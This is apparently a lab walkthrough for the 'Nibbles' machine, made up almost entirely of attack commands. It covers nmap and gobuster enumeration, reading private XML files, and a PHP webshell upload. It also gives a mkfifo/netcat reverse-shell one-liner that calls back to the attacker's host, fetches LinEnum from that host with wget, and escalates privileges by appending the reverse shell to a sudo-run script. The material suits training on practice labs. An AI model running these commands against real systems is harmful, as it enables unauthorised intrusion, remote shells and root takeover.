# Enumeration
###### **NMAP**
```nmap
nmap -sV --open -oA nibbles_initial_scan <TARGET-IP>
```

```nmap
nmap -sC -p 22,80 -oA nibbles_script_scan <TARGET-IP>
```

```nmap
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <TARGET-IP>
```
###### **BANNER GRABBING**
```nmap
nc -nv <TARGET-IP> <PORT>
```
# Web Footprinting
## whatweb
```bash
whatweb <TARGET-IP>/nibbleblog
```
## Directory Enumeration
```bash
gobuster dir -u http://<TARGET-IP>/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
```

```bash
curl http://10.129.42.190/nibbleblog/README
```

```bash
curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
```

```bash
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
```
# Initial Foothold
###### Webshell
```php
<?php system('id'); ?>
```
###### Test Webshell
```shell
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```
###### PHP Script
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <OUR IP> <LISTENING PORT) >/tmp/f
```

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <OUR-IP> <PORT> >/tmp/f"); ?>
```
###### Netcat
```shell
nc -lvnp <PORT>
```
###### Upgrade Shell
```shell
which python3 or which python2 or which python
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
# Privilege Escalation
```shell
unzip personal.zip
```

```shell
cat monitor.sh
```
###### Main Terminal
[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
```shell
sudo python3 -m http.server <PORT>
```
###### New netcat
```shell
nc -lvnp <PORT>
```
###### Target Terminal
```bash
wget http://<OUR IP>:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

```shell
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <OUR IP> <PORT> >/tmp/f' | tee -a monitor.sh
```

```shell
sudo /home/nibbler/personal/stuff/monitor.sh 
```



